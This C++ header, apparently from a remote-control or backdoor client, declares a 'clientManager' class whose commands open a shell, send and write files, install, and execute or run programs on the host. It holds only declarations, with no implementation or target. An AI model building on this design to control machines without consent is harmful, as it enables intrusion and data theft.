#ifndef DIRTYMODULES_H
#define DIRTYMODULES_H

#include <vector>
#include <string>
#include <python3.8/Python.h>

#include "pyhelper.hpp"

typedef enum 
opcao
{
    op_openShell,
    op_sendfile,
    op_writefile,
    op_execute,
    op_install,
    op_run,
    op_isOK,
    op_nop
} options;

options 
cmd2Enum( string& cmd );


class clientManager
{
private:
    CPyInstance hInstancePtr;

    
    CPyObject pModule;
    CPyObject pyAdmin;
    CPyObject link;

    void makeRegister();
    

public:

     clientManager(/* args */);
    ~clientManager();

    vector <string> getComand();

    void openShell(vector <string> cmd);

    void sendfile(vector <string> cmd);

    void writefile(vector <string> cmd);

    void execute(vector <string> cmd);

    void run(vector <string> cmd);

    void isOK();

};

#endif